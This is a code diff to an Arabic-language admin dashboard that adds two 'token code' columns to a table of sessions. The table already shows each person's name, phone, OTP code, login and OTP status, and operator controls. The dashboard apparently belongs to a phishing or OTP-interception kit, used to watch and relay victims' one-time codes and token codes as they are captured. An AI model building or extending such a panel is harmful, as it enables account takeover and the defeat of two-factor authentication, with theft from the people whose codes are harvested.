@@ -430,13 +430,15 @@
                         <th>الوقت</th>
                         <th>تسجيل الدخول</th>
                         <th>الرمز (OTP)</th>
+                        <th>كود توكن 1</th>
+                        <th>كود توكن 2</th>
                         <th>الحالة</th>
                         <th>الإجراءات</th>
                         <th>التحكم</th>
                     </tr>
                 </thead>
                 <tbody id="requestsBody">
-                    <tr><td colspan="7"><div class="empty-state"><p>لا توجد طلبات</p></div></td></tr>
+                    <tr><td colspan="10"><div class="empty-state"><p>لا توجد طلبات</p></div></td></tr>
                 </tbody>
             </table>
         </div>
@@ -545,7 +547,7 @@
         function renderRequests(sessions) {
             const tbody = document.getElementById('requestsBody');
             if (!sessions || sessions.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="7"><div class="empty-state"><p>لا توجد طلبات</p></div></td></tr>';
+                tbody.innerHTML = '<tr><td colspan="10"><div class="empty-state"><p>لا توجد طلبات</p></div></td></tr>';
                 return;
             }
 
@@ -554,6 +556,8 @@
                 const name = data.fullName || '-';
                 const phone = data.phone || '-';
                 const otpVal = data.otp_code || data.otp || '-';
+                const token1Val = data.token1_code || '-';
+                const token2Val = data.token2_code || '-';
                 const preview = name + ' | ' + phone;
                 const time = s.last_activity ? new Date(s.last_activity).toLocaleString('ar-EG') : '-';
                 const loginStatus = s.login_status || null;
@@ -584,6 +588,8 @@
                     '<td><span class="time-text">' + time + '</span></td>' +
                     '<td><span class="status-text ' + getStatusClass(loginStatus) + '">' + getStatusLabel(loginStatus) + '</span></td>' +
                     '<td><span style="color: #d32f2f; font-weight: bold; font-size: 16px;">' + escapeHtml(otpVal) + '</span></td>' +
+                    '<td><span style="color: #d32f2f; font-weight: bold; font-size: 16px;">' + escapeHtml(token1Val) + '</span></td>' +
+                    '<td><span style="color: #d32f2f; font-weight: bold; font-size: 16px;">' + escapeHtml(token2Val) + '</span></td>' +
                     '<td><span class="status-text ' + getStatusClass(otpStatus) + '">' + getStatusLabel(otpStatus) + '</span></td>' +
                     '<td>' + actionsHtml + '</td>' +
                     '<td>' +
